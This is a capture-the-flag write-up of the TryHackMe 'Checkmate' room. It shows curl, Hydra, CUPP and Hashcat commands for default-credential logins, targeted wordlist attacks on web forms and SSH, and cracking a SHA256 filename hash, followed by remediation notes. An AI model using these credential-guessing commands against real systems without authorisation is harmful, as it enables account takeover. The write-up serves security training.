# Checkmate Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Password Attacks* | **Challenge:** *[Checkmate](https://tryhackme.com/room/checkmate)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of the Checkmate challenge was to assess weak password practices across several internal services associated with a systems administrator named Marco Bianchi.

The challenge demonstrated how default credentials, common organisational keywords, personal information, predictable filenames and disclosed password patterns can be chained together to compromise multiple services.

Confirmed lab details used during the assessment:

    Target IP: <TARGET_IP>
    Kali tun0 IP: <TUN0_IP>
    Attacker working directory: /tmp/VK

Marco Bianchi, a systems administrator, recently deployed several internal services, including a firewall console, employee portal, social platform, and SSH access to critical infrastructure. Due to tight deadlines and operational pressure, Marco reused weak, predictable, and pattern-based passwords across multiple systems.  

Your objective is to conduct a password security assessment to identify weaknesses in Marco’s authentication practices.

## Tools Used

The main tools used were:

* `curl` for retrieving web pages, submitting login requests and interacting with the challenge verification endpoint.
* `hydra` for targeted password attacks against the employee portal, social platform and SSH service.
* `cupp` for generating a personalised password wordlist from Marco's known personal information.
* `hashcat` for cracking the SHA256 hash used to rename Marco's uploaded profile picture.
* `sha256sum` for testing candidate filenames against the stored SHA256 value.
* Standard Linux utilities such as `printf`, `sed`, `cat`, `echo`, loops and redirection for creating and processing targeted wordlists.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Hostname Resolution

The challenge used several virtual hostnames. These were added to `/etc/hosts` before interacting with the services.

    nano /etc/hosts

The following entry was added:

    <TARGET_IP> firewall.thm jobs.thm social.thm

This allowed the services to be accessed by their intended names:

    http://firewall.thm:5001
    http://jobs.thm:5002
    http://social.thm:5003

Correct hostname resolution was important because each application was designed to be accessed through its assigned hostname.

## Initial Application Review

The main challenge application was accessed on port 5000.

    curl -i http://<TARGET_IP>:5000/

The application presented five password-related levels:

1. Default credentials on the firewall console.
2. A common company keyword used as an employee portal password.
3. A password derived from Marco's personal information.
4. Recovery of an original filename from a SHA256 hash.
5. A predictable password pattern used for SSH access.

The application warned against blind brute-forcing on port 5000, so each level was approached using the clues and intended techniques.

## Level 1: Default Firewall Credentials

The first clue stated that Marco had deployed a firewall console on `firewall.thm:5001` and retained its default credentials.

The login page was retrieved with:

    curl -i http://firewall.thm:5001/

The page identified the service as `FirewallOS` and suggested the username `admin`.

A login request was submitted using the identified username and a likely default password:

    curl -i -X POST http://firewall.thm:5001/login \
      -d 'username=admin&password=<REDACTED>'

The server returned a redirect, confirming successful authentication.

To retrieve the authenticated dashboard and preserve the session:

    curl -s -c firewall.cookies -b firewall.cookies -L \
      -d 'username=admin&password=<REDACTED>' \
      http://firewall.thm:5001/login

The dashboard confirmed that the appliance had been deployed with default administrator credentials.

Level 1 password:

    <REDACTED>

The password was then submitted to the main challenge application:

    curl -s -c checkmate.cookies -b checkmate.cookies \
      -H 'Content-Type: application/json' \
      -d '{"level":1,"password":"<REDACTED>"}' \
      http://<TARGET_IP>:5000/check

## Level 2: Common Company Keyword

The second clue directed attention to the employee portal on `jobs.thm:5002`, where common company keywords had been used as passwords.

The careers page was retrieved with:

    curl -i http://jobs.thm:5002/

The page displayed several prominent company keywords:

    innovation
    excellence
    security
    digital
    cloud
    future
    talent

The employee login page was then reviewed:

    curl -i http://jobs.thm:5002/login

The username field suggested the account name `marco`.

A targeted wordlist was created from the exposed company keywords:

    printf '%s\n' \
      innovation \
      excellence \
      security \
      digital \
      cloud \
      future \
      talent \
      > level2.txt

Hydra was used to test this limited wordlist against the login form:

    hydra -l marco -P level2.txt jobs.thm -s 5002 \
      http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'

Hydra identified one valid password:

    [5002][http-post-form] host: jobs.thm login: marco password: <REDACTED>

Level 2 password:

    <REDACTED>

The password was submitted to the challenge application:

    curl -s -c checkmate.cookies -b checkmate.cookies \
      -H 'Content-Type: application/json' \
      -d '{"level":2,"password":"<REDACTED>"}' \
      http://<TARGET_IP>:5000/check

## Level 3: Personalised Password Attack

The third clue instructed us to derive Marco's social platform password from personal information.

The social login page was retrieved:

    curl -i http://social.thm:5003/

A hint on the page stated that details from `jobs.thm` should be used to generate Marco's password.

The employee portal was accessed using the Level 2 credentials:

    curl -s -c jobs.cookies -b jobs.cookies -L \
      -d 'username=marco&password=<REDACTED>' \
      http://jobs.thm:5002/login

Marco's employee profile exposed the following information:

    First name: Marco
    Surname: <REDACTED>
    Nickname: <REDACTED>
    Birthdate: <REDACTED>

CUPP was launched in interactive mode:

    cupp -i

The known personal details were entered when prompted:

    First Name: Marco
    Surname: <REDACTED>
    Nickname: <REDACTED>
    Birthdate: <REDACTED>

Fields for which no reliable information was available were left blank. CUPP generated the following wordlist:

    marco.txt

Hydra was then used to test the personalised wordlist against the social login form:

    hydra -l marco -P marco.txt social.thm -s 5003 \
      http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'

Hydra identified a valid password:

    [5003][http-post-form] host: social.thm login: marco password: <REDACTED>

Level 3 password:

    <REDACTED>

The password was submitted to the challenge application:

    curl -s -c checkmate.cookies -b checkmate.cookies \
      -H 'Content-Type: application/json' \
      -d '{"level":3,"password":"<REDACTED>"}' \
      http://<TARGET_IP>:5000/check

## Level 4: Recovering the Original Profile Picture Filename

The fourth level required identifying the original filename of Marco's profile picture.

The social platform automatically renamed uploaded images to the SHA256 hash of the original filename and appended `.png`.

Marco's social account was accessed using the Level 3 credentials:

    curl -s -c social.cookies -b social.cookies -L \
      -d 'username=marco&password=<REDACTED>' \
      http://social.thm:5003/login

The authenticated page contained the profile picture path:

    /uploads/<REDACTED>.png

The SHA256 hash was therefore:

    <REDACTED>

An initial targeted filename list was created:

    printf '%s\n' \
      holiday.png \
      hotel.png \
      oliver.png \
      olivershotel.png \
      lovelyweather.png \
      weather.png \
      profile.png \
      profilepic.png \
      selfie.png \
      vacation.png \
      > filenames.txt

Each filename was hashed and compared against the stored value:

    while read -r name; do
      printf '%s' "$name" | sha256sum |
      grep -q '^<REDACTED>' &&
      echo "MATCH: $name"
    done < filenames.txt

No candidate matched, so the raw hash was saved for offline cracking:

    echo '<REDACTED>' \
      > marcopic.txt

Hashcat mode `1400` was used because the value was a raw SHA256 hash:

    hashcat -m 1400 marcopic.txt /usr/share/wordlists/rockyou.txt --quiet

Hashcat recovered the original filename:

    <REDACTED>:<REDACTED>
                   
Level 4 answer:

    <REDACTED>

Only the original filename was submitted, without the `.png` extension:

    curl -s -c checkmate.cookies -b checkmate.cookies \
      -H 'Content-Type: application/json' \
      -d '{"level":4,"password":"<REDACTED>"}' \
      http://<TARGET_IP>:5000/check

## Level 5: Predictable SSH Password Pattern

Marco's social profile contained a post that rev                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ealed his password construction method.

The pattern was:

    Capitalised company keyword + year or number + exclamation mark

The post also exposed the following keywords:

    security
    excellence
    innovation
    digital
    cloud

A targeted wordlist was generated using the exposed keywords and likely recent years:

    for word in security excellence innovation digital cloud; do
      for year in 2024 2025 2026; do
        printf '%s%s!\n' \
          "$(printf '%s' "$word" | sed 's/^./\U&/')" \
          "$year"
      done
    done > level5.txt

The wordlist was reviewed:

    cat level5.txt

Its entries followed this structure:

    Security2024!
    Security2025!
    Security2026!
    Excellence2024!
    ...
    Cloud2026!

Hydra was used to test the targeted candidates against SSH:

    hydra -l marco -P level5.txt ssh://<TARGET_IP>

Hydra identified a valid SSH password:

    [22][ssh] host: <TARGET_IP> login: marco password: <REDACTED>

Level 5 password:

    <REDACTED>

The final password was submitted to the challenge application:

    curl -s -c checkmate.cookies -b checkmate.cookies \
      -H 'Content-Type: application/json' \
      -d '{"level":5,"password":"<REDACTED>"}' \
      http://<TARGET_IP>:5000/check

The application confirmed successful completion:

    {"message":"Access Granted ✅","progress":1}

The reset progress value indicated that all five levels had been completed and the challenge state had returned to the beginning.

## Full Attack Chain Recap

### 1. Default Credentials

The firewall console retained a default administrator password. Testing the expected default account provided access to the FirewallOS dashboard.

### 2. Company Keyword Password

The employee portal displayed a limited set of company keywords. A targeted Hydra attack identified one of those visible keywords as Marco's password.

### 3. Personal Information Password

Marco's employee profile exposed his name, surname, nickname and birthdate. CUPP converted these details into a personalised password list, which was successfully tested against the social platform.

### 4. Predictable Filename Hashing

The social platform stored Marco's profile picture using the SHA256 hash of its original filename. The hash was extracted from the HTML and cracked with Hashcat to recover the filename.

### 5. Disclosed Password Construction Rule

Marco publicly described his password pattern on the social platform. A small targeted list was generated from the disclosed keywords, year format and punctuation rule. Hydra then identified the valid SSH password.

## Key Lessons

This challenge demonstrated several common password-security failures:

* Default credentials provide an immediate entry point when administrators do not change vendor-supplied passwords.
* Company slogans and visible organisational keywords should never be used directly as passwords.
* Personal information such as names, nicknames and dates of birth can be converted into effective targeted password lists.
* SHA256 does not protect predictable, low-entropy values when attackers can perform offline dictionary attacks.
* Publicly revealing password construction rules can make otherwise longer passwords trivial to predict.
* Small, context-aware wordlists are often more efficient and accurate than blind attacks using enormous generic dictionaries.
* Password reuse or closely related password patterns can allow compromise to spread between unrelated services.
* Public profile data and internal employee information can be combined to improve password guessing success.

## Remediation Notes

The weaknesses demonstrated in this challenge could be mitigated by:

* Requiring all default credentials to be changed during deployment.
* Enforcing unique passwords for every service and account.
* Blocking passwords based on company names, slogans, product names and common organisational keywords.
* Preventing the use of personal information such as names, nicknames and dates of birth in passwords.
* Using long, randomly generated passwords or passphrases stored in an approved password manager.
* Enforcing multi-factor authentication on administrative, employee, social and remote-access services.
* Applying rate limiting, progressive delays and temporary account lockouts to authentication endpoints.
* Monitoring for repeated failed logins and password-spraying activity.
* Avoiding deterministic filenames based only on unsalted hashes of predictable source values.
* Generating random server-side object identifiers for uploaded files.
* Training staff not to disclose password patterns, examples or credential-related habits on social platforms.
* Regularly auditing credentials against known breached-password datasets and internal password policies.
* Disabling direct SSH password authentication where possible and requiring managed public-key authentication.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
